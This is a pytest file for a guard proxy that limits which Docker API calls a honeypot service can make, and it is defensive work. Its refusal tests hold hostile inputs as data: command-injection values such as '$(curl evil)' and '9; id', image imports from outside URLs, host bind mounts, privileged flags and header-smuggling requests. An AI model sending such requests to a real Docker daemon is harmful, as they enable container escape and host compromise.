"""The Docker guard: what the honeypot service may ask the Docker daemon for, and nothing else.

Docker access is root on the host, and the honeypot service parses attacker-controlled bytes
all day, so the service is kept out of the `docker` group and talks to this guard instead. The
guard's value is what it refuses; the first group of tests pins the refusals, the second pins
that the request the SSH engine *really* builds is accepted (a guard that blocks the engine's
own container would be switched off the first time it broke a deploy), and the third drives the
proxy over a real unix socket against a fake daemon.
"""

from __future__ import annotations

import asyncio
import copy
import json
import os
import tempfile
from pathlib import Path
from typing import Any
from unittest import mock

import pytest

# Before any honeypot_mcp import: importing the engines builds Settings, and without this the first
# module of a run to do so creates ./honeypot_mcp.db in the working directory.
os.environ["DATABASE_URL"] = os.environ.get("TEST_DATABASE_URL", "sqlite+aiosqlite:///:memory:")

from honeypot_mcp.engines.cowrie_fs import BASE_PICKLE_PATH, PERSONA_DIR
from honeypot_mcp.engines.cowrie_limits import (
    COWRIE_IMAGE,
    COWRIE_MEM_LIMIT_BYTES,
    COWRIE_NANO_CPUS,
    COWRIE_PIDS_LIMIT,
    COWRIE_TMPFS,
)
from honeypot_mcp.hardening import docker_guard as guard
from honeypot_mcp.hardening.docker_guard import Denied, check

# ── a create body exactly as the engine's settings produce it ────────────────────────────────

GOOD: dict[str, Any] = {
    "Image": COWRIE_IMAGE,
    "Labels": {"honeypot-mcp": "true", "honeypot-name": "web1"},
    "Env": ["COWRIE_HONEYPOT_HOSTNAME=web1"],
    "ExposedPorts": {"2222/tcp": {}},
    "Cmd": None,
    "Entrypoint": None,
    "User": None,
    "HostConfig": {
        "Memory": COWRIE_MEM_LIMIT_BYTES,
        "PidsLimit": COWRIE_PIDS_LIMIT,
        "NanoCpus": COWRIE_NANO_CPUS,
        "CapDrop": ["ALL"],
        "ReadonlyRootfs": True,
        "SecurityOpt": ["no-new-privileges:true"],
        "Dns": ["127.0.0.1"],
        "RestartPolicy": {"Name": "unless-stopped"},
        "PortBindings": {"2222/tcp": [{"HostIp": "", "HostPort": "22"}]},
        "Tmpfs": dict(COWRIE_TMPFS),
        "Mounts": [{"Type": "volume", "Target": PERSONA_DIR}],
        "LogConfig": {"Type": "json-file", "Config": {"max-size": "10m", "max-file": "3"}},
    },
}
QUERY = "name=honeypot-web1"


def _create(body: dict[str, Any], query: str = QUERY) -> guard.Verdict:
    return check("POST", f"/v1.43/containers/create?{query}", json.dumps(body).encode())


def _with(**host: Any) -> dict[str, Any]:
    body = copy.deepcopy(GOOD)
    body["HostConfig"].update(host)
    return body


def test_the_expected_create_request_is_accepted():
    assert _create(GOOD) == guard.Verdict(content_type="application/json")


@pytest.mark.parametrize(
    ("what", "body"),
    [
        ("privileged", _with(Privileged=True)),
        ("host bind mount", _with(Binds=["/:/host"])),
        (
            "host bind via Mounts",
            _with(Mounts=[{"Type": "bind", "Source": "/", "Target": "/host"}]),
        ),
        (
            "named volume on the host path",
            _with(Mounts=[{"Type": "volume", "Source": "/etc", "Target": PERSONA_DIR}]),
        ),
        ("volume at another path", _with(Mounts=[{"Type": "volume", "Target": "/etc"}])),
        ("two mounts", _with(Mounts=[{"Type": "volume", "Target": PERSONA_DIR}] * 2)),
        ("host network", _with(NetworkMode="host")),
        ("another container's network", _with(NetworkMode="container:abc")),
        ("host pid namespace", _with(PidMode="host")),
        ("host ipc namespace", _with(IpcMode="host")),
        ("host uts namespace", _with(UTSMode="host")),
        ("user namespace override", _with(UsernsMode="host")),
        ("added capability", _with(CapAdd=["SYS_ADMIN"])),
        ("capabilities not dropped", _with(CapDrop=["NET_RAW"])),
        ("no capability drop", _with(CapDrop=None)),
        ("seccomp unconfined", _with(SecurityOpt=["seccomp=unconfined"])),
        ("apparmor unconfined", _with(SecurityOpt=["apparmor=unconfined"])),
        ("a device", _with(Devices=[{"PathOnHost": "/dev/sda", "PathInContainer": "/dev/sda"}])),
        ("device request (gpu)", _with(DeviceRequests=[{"Count": -1}])),
        ("writable root", _with(ReadonlyRootfs=False)),
        ("no memory limit", _with(Memory=0)),
        ("memory over the ceiling", _with(Memory=COWRIE_MEM_LIMIT_BYTES + 1)),
        ("swap over the ceiling", _with(MemorySwap=COWRIE_MEM_LIMIT_BYTES * 3)),
        ("no pids limit", _with(PidsLimit=0)),
        ("pids over the ceiling", _with(PidsLimit=COWRIE_PIDS_LIMIT + 1)),
        ("no cpu limit", _with(NanoCpus=0)),
        ("cpu over the ceiling", _with(NanoCpus=COWRIE_NANO_CPUS * 4)),
        ("publishing another port", _with(PortBindings={"22/tcp": [{"HostPort": "2200"}]})),
        ("a non-numeric host port", _with(PortBindings={"2222/tcp": [{"HostPort": "x"}]})),
        ("host port 0", _with(PortBindings={"2222/tcp": [{"HostPort": "0"}]})),
        ("publish all ports", _with(PublishAllPorts=True)),
        ("extra tmpfs", _with(Tmpfs={"/host": "rw"})),
        ("tmpfs with executable options", _with(Tmpfs={"/tmp": "rw,exec,size=999g"})),
        ("dns that is not an address", _with(Dns=["$(curl evil)"])),
        ("a log driver that ships elsewhere", _with(LogConfig={"Type": "syslog"})),
        ("sysctls", _with(Sysctls={"net.ipv4.ip_forward": "1"})),
        ("links", _with(Links=["other:o"])),
        ("extra hosts", _with(ExtraHosts=["metadata:169.254.169.254"])),
        ("volumes-from", _with(VolumesFrom=["other"])),
        ("an unknown host option that does something", _with(CgroupParent="/system.slice")),
    ],
)
def test_a_create_request_that_weakens_the_sandbox_is_refused(what, body):
    with pytest.raises(Denied):
        _create(body)


@pytest.mark.parametrize(
    ("what", "mutate"),
    [
        ("another image", lambda b: b.update(Image="alpine:latest")),
        ("the same repository, another tag", lambda b: b.update(Image="cowrie/cowrie:latest")),
        (
            "a different registry's look-alike",
            lambda b: b.update(Image="evil/cowrie/cowrie:3.0.15"),
        ),
        ("no label", lambda b: b.update(Labels={})),
        ("label false", lambda b: b.update(Labels={"honeypot-mcp": "false"})),
        ("a command", lambda b: b.update(Cmd=["/bin/sh", "-c", "id"])),
        ("an entrypoint", lambda b: b.update(Entrypoint=["/bin/sh"])),
        ("a user", lambda b: b.update(User="root")),
        ("working dir", lambda b: b.update(WorkingDir="/")),
        ("anonymous volumes in the config", lambda b: b.update(Volumes={"/": {}})),
        ("a tty and stdin", lambda b: b.update(Tty=True, OpenStdin=True)),
        ("another exposed port", lambda b: b.update(ExposedPorts={"2375/tcp": {}})),
        (
            "endpoint config (a fixed address / alias)",
            lambda b: b.update(
                NetworkingConfig={"EndpointsConfig": {"bridge": {"IPAddress": "172.17.0.99"}}}
            ),
        ),
        ("a field the guard has never heard of", lambda b: b.update(Surprise="x")),
        (
            "a healthcheck that runs commands",
            lambda b: b.update(Healthcheck={"Test": ["CMD", "id"]}),
        ),
        ("env that is not a list", lambda b: b.update(Env={"A": "B"})),
        ("no host config", lambda b: b.pop("HostConfig")),
    ],
)
def test_a_create_request_for_anything_but_the_engines_container_is_refused(what, mutate):
    body = copy.deepcopy(GOOD)
    mutate(body)
    with pytest.raises(Denied):
        _create(body)


@pytest.mark.parametrize(
    "name", ["", "evil", "honeypot-", "honeypot-/../x", "honeypot-a b", "x-honeypot-a"]
)
def test_only_honeypot_named_containers_may_be_created(name):
    with pytest.raises(Denied):
        _create(GOOD, f"name={name}")
    with pytest.raises(Denied):
        _create(GOOD, "")


def test_a_create_body_that_is_not_json_or_not_an_object_is_refused():
    with pytest.raises(Denied):
        check("POST", f"/containers/create?{QUERY}", b"{not json")
    with pytest.raises(Denied):
        check("POST", f"/containers/create?{QUERY}", b"[1]")
    with pytest.raises(Denied):
        check("POST", f"/containers/create?{QUERY}", b" " * (guard.MAX_JSON_BODY + 1))


def test_empty_values_for_forbidden_settings_are_what_the_sdk_sends_and_are_accepted():
    body = _with(Binds=None, Privileged=False, CapAdd=[], Devices=None, PublishAllPorts=False)
    body.update(Volumes=None, Tty=False, OpenStdin=False, WorkingDir="", NetworkingConfig={})
    body["HostConfig"]["NetworkMode"] = "default"
    assert _create(body).content_type == "application/json"


# ── everything else the Docker API offers ────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("method", "target"),
    [
        ("GET", "/_ping"),
        ("HEAD", "/_ping"),
        ("GET", "/version"),
        ("GET", "/v1.43/version"),
        ("GET", '/containers/json?all=1&filters={"label":["honeypot-mcp=true"]}'),
        ("GET", '/containers/json?filters={"label":{"honeypot-mcp=true":true}}'),
        ("GET", "/containers/abc123/json"),
        ("GET", "/containers/honeypot-web1/json"),
        ("POST", "/containers/abc123/start"),
        ("POST", "/containers/abc123/stop?t=5"),
        ("POST", "/containers/abc123/restart"),
        ("POST", "/containers/abc123/pause"),
        ("POST", "/containers/abc123/unpause"),
        ("POST", "/containers/abc123/kill?signal=SIGKILL"),
        ("DELETE", "/containers/abc123?v=1&force=1"),
        ("GET", "/containers/abc123/logs?stdout=1&tail=100&timestamps=1"),
        ("PUT", f"/containers/abc123/archive?path={PERSONA_DIR}"),
        ("GET", f"/containers/abc123/archive?path={BASE_PICKLE_PATH}"),
        ("HEAD", f"/containers/abc123/archive?path={BASE_PICKLE_PATH}"),
        ("GET", "/containers/abc123/archive?path=/cowrie/cowrie-git/var/lib/cowrie/downloads"),
        ("GET", "/containers/abc123/archive?path=/cowrie/cowrie-git/var/lib/cowrie/tty"),
        ("GET", "/containers/abc123/archive?path=/cowrie/var/lib/cowrie/downloads"),
        ("HEAD", "/containers/abc123/archive?path=/cowrie/var/lib/cowrie/tty"),
        ("GET", f"/images/{COWRIE_IMAGE}/json"),
        ("GET", f"/v1.43/images/{COWRIE_IMAGE}/json"),
        ("POST", f"/images/create?fromImage={COWRIE_IMAGE}"),
        ("POST", "/images/create?fromImage=cowrie/cowrie&tag=3.0.15"),
    ],
)
def test_the_calls_the_engine_makes_are_allowed(method, target):
    body = b"x" if method == "PUT" else b""
    assert isinstance(check(method, target, body), guard.Verdict)


@pytest.mark.parametrize(
    ("method", "target"),
    [
        ("POST", "/containers/abc123/exec"),
        ("POST", "/exec/abc/start"),
        ("POST", "/containers/abc123/attach"),
        ("POST", "/containers/abc123/update"),
        ("POST", "/containers/abc123/rename?name=x"),
        ("POST", "/containers/abc123/commit"),
        ("GET", "/containers/abc123/export"),
        ("GET", "/containers/abc123/top"),
        ("GET", "/containers/abc123/changes"),
        ("POST", "/commit?container=abc123"),
        ("POST", "/containers/prune"),
        ("GET", "/containers/json"),
        ("GET", "/containers/json?all=1"),
        ("GET", '/containers/json?filters={"label":["other=true"]}'),
        ("GET", '/containers/json?filters={"status":["running"]}'),
        ("GET", "/containers/json?filters=not-json"),
        ("GET", "/info"),
        ("GET", "/events"),
        ("GET", "/system/df"),
        ("POST", "/auth"),
        ("POST", "/build"),
        ("GET", "/images/json"),
        ("DELETE", f"/images/{COWRIE_IMAGE}"),
        ("POST", "/images/create?fromImage=alpine&tag=latest"),
        ("POST", "/images/create?fromImage=cowrie/cowrie&tag=latest"),
        ("POST", f"/images/create?fromImage={COWRIE_IMAGE}&fromSrc=http://evil/x.tar"),
        ("POST", f"/images/create?fromImage={COWRIE_IMAGE}&repo=evil"),
        ("GET", "/images/alpine/json"),
        ("POST", "/images/load"),
        ("GET", "/volumes"),
        ("POST", "/volumes/create"),
        ("GET", "/networks"),
        ("POST", "/networks/create"),
        ("POST", "/networks/bridge/connect"),
        ("GET", "/swarm"),
        ("POST", "/swarm/init"),
        ("GET", "/plugins"),
        ("POST", "/plugins/pull"),
        ("GET", "/secrets"),
        ("GET", "/services"),
        ("GET", "/_ping/../info"),
        ("GET", "/"),
        ("TRACE", "/_ping"),
        ("POST", "/_ping"),
        ("POST", "/version"),
        ("PUT", "/containers/abc123/start"),
        ("GET", "/containers/abc123/start"),
        ("DELETE", "/containers/abc123/json"),
    ],
)
def test_everything_the_engine_does_not_do_is_refused(method, target):
    with pytest.raises(Denied):
        check(method, target, b"")


@pytest.mark.parametrize(
    "path",
    [
        "/etc",
        "/",
        "/cowrie/persona/../../etc",
        "/cowrie/persona/x",
        "/proc/1/root",
        "",
    ],
)
def test_the_archive_endpoint_only_reads_and_writes_the_two_paths_the_engine_uses(path):
    with pytest.raises(Denied):
        check("PUT", f"/containers/abc/archive?path={path}", b"x")
    with pytest.raises(Denied):
        check("GET", f"/containers/abc/archive?path={path}", b"")
    # The paths are not interchangeable: the persona directory is written, the base pickle read.
    with pytest.raises(Denied):
        check("PUT", f"/containers/abc/archive?path={BASE_PICKLE_PATH}", b"x")
    with pytest.raises(Denied):
        check("GET", f"/containers/abc/archive?path={PERSONA_DIR}", b"")


@pytest.mark.parametrize(
    "path",
    [
        "/cowrie/cowrie-git/var/lib/cowrie",
        "/cowrie/cowrie-git/var/lib/cowrie/downloads/x",
        "/cowrie/cowrie-git/var/lib/cowrie/downloads/../../../etc",
        "/cowrie/cowrie-git/var/lib/cowrie/ssh_host_rsa_key",
        "/cowrie/cowrie-git/etc",
        "/cowrie/var/lib/cowrie/tty/",
    ],
)
def test_the_capture_directories_are_readable_but_nothing_around_them(path):
    """`sample_collect` copies the two directories out. The host keys that sit beside them, the
    config and anything below or above must stay unreachable, and nothing may be written there."""
    with pytest.raises(Denied):
        check("GET", f"/containers/abc/archive?path={path}", b"")
    with pytest.raises(Denied):
        check("PUT", f"/containers/abc/archive?path={path}", b"x")


def test_the_capture_directories_cannot_be_written_through_the_guard():
    for path in ("/cowrie/cowrie-git/var/lib/cowrie/downloads", "/cowrie/var/lib/cowrie/tty"):
        with pytest.raises(Denied):
            check("PUT", f"/containers/abc/archive?path={path}", b"x")


def test_an_oversized_archive_is_refused():
    with pytest.raises(Denied) as exc:
        check(
            "PUT",
            f"/containers/abc/archive?path={PERSONA_DIR}",
            b"x" * (guard.MAX_ARCHIVE_BODY + 1),
        )
    assert exc.value.status == 413


@pytest.mark.parametrize("signal", ["SIGHUP", "SIGUSR1", "STOP", "0", "9; id"])
def test_kill_only_accepts_termination_signals(signal):
    with pytest.raises(Denied):
        check("POST", f"/containers/abc/kill?signal={signal}", b"")


@pytest.mark.parametrize(
    "target",
    [
        "/containers/../info",
        "/containers/abc/%2e%2e/info",
        "/containers//abc/json",
        "/containers/abc/./json",
        "/containers/a b/json",
        "/containers/abc/json\x00",
        "/containers/-rf/json",
        "/containers/" + "a" * 200 + "/json",
        "/containers/abc\u00e9/json",
    ],
)
def test_paths_that_could_smuggle_a_different_endpoint_are_refused(target):
    with pytest.raises(Denied):
        check("GET", target, b"")


def test_a_container_scoped_call_asks_for_a_label_check_of_that_container():
    assert check("POST", "/v1.43/containers/abc123/stop?t=5", b"").container == "abc123"
    assert check("GET", "/containers/honeypot-web1/json", b"").container == "honeypot-web1"
    assert check("GET", "/version", b"").container is None


# ── the request the engine actually builds ───────────────────────────────────────────────────


def _engine_create_bodies(
    deploy_type: str, config: dict[str, Any], *, egress: bool
) -> list[tuple[str, dict]]:
    """Run the real SSH/Telnet engine's `start()` against a recording client and render every
    `containers.create` call into the JSON body docker-py would send (offline: no daemon)."""
    from docker.api import APIClient
    from docker.models.containers import _create_container_args

    from honeypot_mcp.engines.ssh import SSHEngine
    from honeypot_mcp.engines.telnet import TelnetEngine

    api = APIClient(base_url="unix:///nonexistent.sock", version="1.43")
    recorded: list[tuple[str, dict]] = []

    def create(image: str, command: Any = None, **kwargs: Any) -> Any:
        kwargs.update(image=image, command=command, version=api._version)
        created = _create_container_args(kwargs)
        name = created.pop("name")
        recorded.append((name, api.create_container_config(**created)))
        container = mock.MagicMock()
        container.id = "c" * 64
        container.get_archive.side_effect = RuntimeError("no daemon: persona delivery falls back")
        return container

    client = mock.MagicMock()
    client.containers.create.side_effect = create
    settings = mock.MagicMock()
    settings.cowrie_allow_egress = egress
    engine_cls = TelnetEngine if deploy_type == "telnet" else SSHEngine

    class _NoDatabase:
        """`start()` persists the persona it picked into the honeypot row; this test is about the
        Docker request, so the session is a stand-in and no database (the developer's, or a test
        one another test left in some state) is ever opened."""

        async def __aenter__(self):
            return mock.AsyncMock()

        async def __aexit__(self, *exc):
            return False

    with (
        mock.patch("docker.from_env", return_value=client),
        mock.patch("honeypot_mcp.engines.ssh.get_settings", return_value=settings),
        mock.patch("honeypot_mcp.engines.ssh.get_session", lambda: _NoDatabase()),
        mock.patch("honeypot_mcp.engines.ssh._deliver_persona_fs") as deliver,
    ):
        engine = engine_cls()
        asyncio.run(engine.start("web1", 2222, dict(config)))
        # Also build the no-persona fallback the engine uses when delivery fails.
        deliver.side_effect = RuntimeError("persona delivery failed")
        asyncio.run(engine.start("web2", 2223, dict(config)))
    return recorded


@pytest.mark.parametrize(
    ("deploy_type", "config", "egress"),
    [
        ("ssh", {}, False),
        ("ssh", {"ssh_persona": "debian_12"}, False),
        ("ssh", {"telnet_enabled": True, "telnet_port": 23}, False),
        ("telnet", {}, False),
        ("ssh", {}, True),  # cowrie_allow_egress: the container keeps the default resolver
    ],
)
def test_the_engines_own_create_requests_pass_the_guard(deploy_type, config, egress):
    bodies = _engine_create_bodies(deploy_type, config, egress=egress)
    assert len(bodies) >= 2, "the persona-volume create and the no-persona fallback"
    for name, body in bodies:
        assert check(
            "POST", f"/v1.43/containers/create?name={name}", json.dumps(body).encode()
        ) == guard.Verdict(content_type="application/json")


# ── the proxy, over a real unix socket, against a fake daemon ────────────────────────────────


class FakeDocker:
    """A daemon that records requests and answers the few the guard itself makes."""

    def __init__(self, path: str) -> None:
        self.path = path
        self.requests: list[tuple[str, str, bytes]] = []
        self.headers: list[dict[str, str]] = []
        self.labelled = {"honeypot-ok": True, "other": False}
        self.server: asyncio.AbstractServer | None = None
        self.stream_open = asyncio.Event()
        self.stream_closed = asyncio.Event()

    async def start(self) -> None:
        self.server = await asyncio.start_unix_server(self._serve, path=self.path)

    async def _serve(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        try:
            head = await reader.readuntil(b"\r\n\r\n")
            line, *rest = head.decode().split("\r\n")
            method, target, _ = line.split(" ")
            headers = {
                h.split(":", 1)[0].lower(): h.split(":", 1)[1].strip() for h in rest if ":" in h
            }
            body = await reader.readexactly(int(headers.get("content-length", 0)))
            self.requests.append((method, target, body))
            self.headers.append(headers)
            if target.endswith("/json") and "/containers/" in target:
                ref = target.split("/containers/")[1].split("/")[0]
                if ref not in self.labelled:
                    writer.write(
                        b"HTTP/1.1 404 Not Found\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}"
                    )
                else:
                    payload = json.dumps(
                        {
                            "Config": {
                                "Labels": {"honeypot-mcp": "true"} if self.labelled[ref] else {}
                            }
                        }
                    ).encode()
                    writer.write(
                        b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n"
                        + f"Content-Length: {len(payload)}\r\n\r\n".encode()
                        + payload
                    )
            elif target.endswith("/logs?follow=1"):
                writer.write(
                    b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
                )
                writer.write(b"5\r\nhello\r\n")
                await writer.drain()
                self.stream_open.set()
                await reader.read()  # until the guard closes us
                self.stream_closed.set()
                return
            else:
                writer.write(
                    b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK"
                    if method != "HEAD"
                    else b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                )
            await writer.drain()
        finally:
            writer.close()


@pytest.fixture
async def proxy():
    # unix socket paths are short-limited; pytest's tmp_path can exceed it
    directory = tempfile.mkdtemp(prefix="hpg-")
    fake = FakeDocker(os.path.join(directory, "d.sock"))
    await fake.start()
    listen = os.path.join(directory, "g.sock")
    server = await guard.serve(listen, fake.path)
    yield listen, fake, server.guard  # type: ignore[attr-defined]
    server.close()
    fake.server.close()  # type: ignore[union-attr]


async def _roundtrip(listen: str, raw: bytes, *, read: bool = True) -> bytes:
    reader, writer = await asyncio.open_unix_connection(listen)
    writer.write(raw)
    await writer.drain()
    data = await asyncio.wait_for(reader.read(), 5) if read else b""
    writer.close()
    return data


async def test_a_permitted_request_is_forwarded_and_the_reply_relayed_byte_for_byte(proxy):
    listen, fake, g = proxy
    reply = await _roundtrip(
        listen, b"GET /_ping HTTP/1.1\r\nHost: x\r\nUser-Agent: docker-sdk\r\n\r\n"
    )
    assert reply.endswith(b"\r\n\r\nOK") and reply.startswith(b"HTTP/1.1 200 OK")
    assert fake.requests == [("GET", "/_ping", b"")]
    assert g.forwarded == 1 and g.denied == 0


async def test_a_refused_request_never_reaches_the_daemon_and_gets_a_json_403(proxy):
    listen, fake, g = proxy
    reply = await _roundtrip(
        listen, b"POST /containers/abc/exec HTTP/1.1\r\nHost: x\r\nContent-Length: 2\r\n\r\n{}"
    )
    head, _, body = reply.partition(b"\r\n\r\n")
    assert head.startswith(b"HTTP/1.1 403")
    assert "not permitted" in json.loads(body)["message"]
    assert fake.requests == []
    assert g.denied == 1


async def test_a_container_without_the_honeypot_label_cannot_be_managed(proxy):
    listen, fake, _ = proxy
    reply = await _roundtrip(listen, b"POST /containers/other/stop HTTP/1.1\r\nHost: x\r\n\r\n")
    assert reply.startswith(b"HTTP/1.1 403")
    assert [t for _, t, _ in fake.requests] == ["/containers/other/json"], (
        "inspected, never stopped"
    )


async def test_a_labelled_container_is_managed_and_a_missing_one_gets_dockers_own_404(proxy):
    listen, fake, _ = proxy
    ok = await _roundtrip(
        listen, b"POST /containers/honeypot-ok/stop?t=5 HTTP/1.1\r\nHost: x\r\n\r\n"
    )
    assert ok.startswith(b"HTTP/1.1 200")
    assert ("POST", "/containers/honeypot-ok/stop?t=5", b"") in fake.requests
    missing = await _roundtrip(listen, b"POST /containers/gone/stop HTTP/1.1\r\nHost: x\r\n\r\n")
    assert missing.startswith(b"HTTP/1.1 200"), (
        "forwarded: the daemon, not the guard, says NotFound"
    )
    assert ("POST", "/containers/gone/stop", b"") in fake.requests


async def test_request_bodies_are_forwarded_exactly_and_framing_is_the_guards_own(proxy):
    listen, fake, _ = proxy
    body = json.dumps(GOOD).encode()
    raw = (
        f"POST /v1.43/containers/create?{QUERY} HTTP/1.1\r\nHost: evil\r\nContent-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\nUpgrade: tcp\r\n\r\n"
    ).encode() + body
    assert (await _roundtrip(listen, raw)).startswith(b"HTTP/1.1 200")
    method, target, forwarded = fake.requests[0]
    assert (method, forwarded) == ("POST", body)
    assert target == f"/v1.43/containers/create?{QUERY}"


async def test_chunked_request_bodies_and_oversized_or_malformed_requests_are_refused(proxy):
    listen, fake, _ = proxy
    chunked = b"POST /containers/create?name=honeypot-a HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
    assert (await _roundtrip(listen, chunked)).startswith(b"HTTP/1.1 411")
    big = b"PUT /containers/honeypot-ok/archive?path=/cowrie/persona HTTP/1.1\r\nContent-Length: 99999999\r\n\r\n"
    assert (await _roundtrip(listen, big)).startswith(b"HTTP/1.1 413")
    for junk in (
        b"GARBAGE\r\n\r\n",
        b"GET /_ping HTTP/1.1\r\nbad header\r\n\r\n",
        b"get /_ping HTTP/1.1\r\n\r\n",
    ):
        assert (await _roundtrip(listen, junk)).startswith(b"HTTP/1.1 400")
    dup = b"POST /containers/create?name=honeypot-a HTTP/1.1\r\nContent-Length: 1\r\nContent-Length: 2\r\n\r\n{}"
    assert (await _roundtrip(listen, dup)).startswith(b"HTTP/1.1 400")
    assert fake.requests == []


async def test_an_oversized_head_is_refused_without_buffering_it(proxy):
    listen, fake, _ = proxy
    reply = await _roundtrip(listen, b"GET /_ping HTTP/1.1\r\nX: " + b"a" * 70000 + b"\r\n\r\n")
    assert reply.startswith(b"HTTP/1.1 400")
    assert fake.requests == []


async def test_a_streaming_response_ends_when_the_client_goes_away(proxy):
    """`logs?follow=1` streams for as long as the container lives; a client that disconnects must
    release the upstream connection, or each abandoned follow leaks a daemon connection."""
    listen, fake, _ = proxy
    reader, writer = await asyncio.open_unix_connection(listen)
    writer.write(b"GET /containers/honeypot-ok/logs?follow=1 HTTP/1.1\r\nHost: x\r\n\r\n")
    await writer.drain()
    first = await asyncio.wait_for(reader.read(200), 5)
    assert b"hello" in first
    await asyncio.wait_for(fake.stream_open.wait(), 5)
    writer.close()
    await asyncio.wait_for(fake.stream_closed.wait(), 5)


async def test_a_dead_daemon_is_a_clean_refusal_not_a_hang(proxy):
    listen, fake, _ = proxy
    fake.server.close()  # type: ignore[union-attr]
    await fake.server.wait_closed()  # type: ignore[union-attr]
    Path(fake.path).unlink(missing_ok=True)
    reply = await _roundtrip(listen, b"GET /_ping HTTP/1.1\r\nHost: x\r\n\r\n")
    assert reply.startswith(b"HTTP/1.1 403") and b"unavailable" in reply


async def test_the_socket_is_not_world_accessible_and_a_stale_socket_is_replaced():
    directory = tempfile.mkdtemp(prefix="hpg-")
    listen = os.path.join(directory, "g.sock")
    Path(listen).write_text("stale")
    server = await guard.serve(listen, os.path.join(directory, "none.sock"))
    try:
        assert os.stat(listen).st_mode & 0o007 == 0, "other users have no access"
        assert os.stat(listen).st_mode & 0o170000 == 0o140000, "it is a socket"
    finally:
        server.close()


async def test_a_connection_from_an_unlisted_user_is_dropped(monkeypatch):
    if not hasattr(__import__("socket"), "SO_PEERCRED"):
        pytest.skip("SO_PEERCRED is Linux-only")
    directory = tempfile.mkdtemp(prefix="hpg-")
    listen = os.path.join(directory, "g.sock")
    server = await guard.serve(
        listen, os.path.join(directory, "none.sock"), allowed_uids={os.getuid() + 1}
    )
    try:
        # Dropped means: nothing is relayed. The guard closes without reading the request, so on Linux
        # the client sees either a clean EOF (empty read) or a reset, depending on timing; both are the
        # same outcome and the test must not depend on which one the kernel picks.
        try:
            reply = await _roundtrip(listen, b"GET /_ping HTTP/1.1\r\n\r\n")
        except (ConnectionResetError, BrokenPipeError):
            reply = b""
        assert reply == b""
        assert server.guard.denied == 1  # type: ignore[attr-defined]
    finally:
        server.close()


async def test_the_socket_group_is_only_changed_when_it_is_not_already_right(monkeypatch):
    """Under systemd the guard runs with `Group=honeypot`, so the socket it creates already has the
    right group, and the unit's syscall filter forbids chown outright (EPERM): the guard must not
    ask. A manual start as another user still gets its chown."""
    import grp

    directory = tempfile.mkdtemp(prefix="hpg-")
    own = grp.getgrgid(os.getgid()).gr_name
    calls: list[tuple] = []

    def refuse(*args):
        calls.append(args)
        raise PermissionError("chown is filtered")

    monkeypatch.setattr(os, "chown", refuse)
    server = await guard.serve(
        os.path.join(directory, "g.sock"), os.path.join(directory, "n.sock"), group=own
    )
    server.close()
    assert calls == [], "the socket was already in the wanted group: no chown"

    other = next((g.gr_name for g in grp.getgrall() if g.gr_gid != os.getgid()), None)
    if other is not None:
        with pytest.raises(PermissionError):
            await guard.serve(
                os.path.join(directory, "g2.sock"), os.path.join(directory, "n.sock"), group=other
            )
        assert len(calls) == 1


@pytest.mark.parametrize(
    "raw",
    [
        # A bare LF inside the query is read by the daemon as the end of the request line.
        b"GET /_ping?a=1\nTransfer-Encoding:chunked HTTP/1.1\r\nHost: x\r\n\r\n",
        # A bare LF inside a header value becomes a header the guard never saw.
        b"GET /_ping HTTP/1.1\r\nHost: x\r\nX-Note: ok\nContent-Length: 0\r\n\r\n",
        # NUL and other control bytes in a header or the target.
        b"GET /_ping HTTP/1.1\r\nX: a\x00b\r\n\r\n",
        b"GET /_ping?a=\x01 HTTP/1.1\r\n\r\n",
        b"GET /_ping\x7f HTTP/1.1\r\n\r\n",
        # A bare CR.
        b"GET /_ping HTTP/1.1\r\nX: a\rb\r\n\r\n",
        # Non-ASCII in the target.
        "GET /_ping?x=é HTTP/1.1\r\n\r\n".encode("latin-1"),
    ],
)
async def test_control_characters_cannot_smuggle_a_header_or_request_through_the_guard(proxy, raw):
    listen, fake, g = proxy
    reply = await _roundtrip(listen, raw)
    assert reply.startswith(b"HTTP/1.1 400"), reply[:80]
    assert fake.requests == [], "nothing reached the daemon"


async def test_a_horizontal_tab_in_a_header_value_is_ordinary_and_forwarded(proxy):
    listen, fake, _ = proxy
    reply = await _roundtrip(listen, b"GET /_ping HTTP/1.1\r\nHost: x\r\nX-Note: a\tb\r\n\r\n")
    assert reply.startswith(b"HTTP/1.1 200")
    assert fake.requests == [("GET", "/_ping", b"")]


# ── the daemon reads more than the query string ──────────────────────────────────────────────
#
# Reproduced against a real daemon (Docker 29.7): a form-encoded POST body is merged into the
# same parameters as the query string, body values first, so a body the guard never inspected
# replaced `signal` (a kill the query check would have refused) and `fromImage`/`fromSrc`/`repo`
# (an import from a URL, tagged as a new image). A repeated key in a create body made the
# daemon merge `{"Privileged": true}` into a container the guard had validated as unprivileged.

FORM = "application/x-www-form-urlencoded"
IMPORT_BODY = b"fromImage=&fromSrc=http://192.0.2.1/x.tar&repo=cowrie/cowrie&tag=3.0.15"


@pytest.mark.parametrize(
    ("method", "target"),
    [
        ("POST", f"/images/create?fromImage={COWRIE_IMAGE}"),
        ("POST", "/images/create?fromImage=cowrie/cowrie&tag=3.0.15"),
        ("POST", "/containers/abc123/kill?signal=TERM"),
        ("POST", "/containers/abc123/kill"),
        ("POST", "/containers/abc123/stop"),
        ("POST", "/containers/abc123/restart"),
        ("POST", "/containers/abc123/start"),
        ("POST", "/containers/abc123/pause"),
        ("DELETE", "/containers/abc123"),
        ("GET", "/containers/abc123/json"),
        ("GET", "/containers/abc123/logs"),
        ("GET", f"/containers/abc123/archive?path={BASE_PICKLE_PATH}"),
        ("GET", "/_ping"),
        ("GET", "/version"),
        ("GET", f"/images/{COWRIE_IMAGE}/json"),
        ("GET", '/containers/json?filters={"label":["honeypot-mcp=true"]}'),
    ],
)
def test_an_endpoint_that_takes_no_body_refuses_one(method, target):
    """Any body: the daemon would merge a form into the validated parameters."""
    assert check(method, target, b"") is not None
    for body in (IMPORT_BODY, b"signal=HUP", b"x"):
        with pytest.raises(Denied) as exc:
            check(method, target, body)
        assert exc.value.status == 400


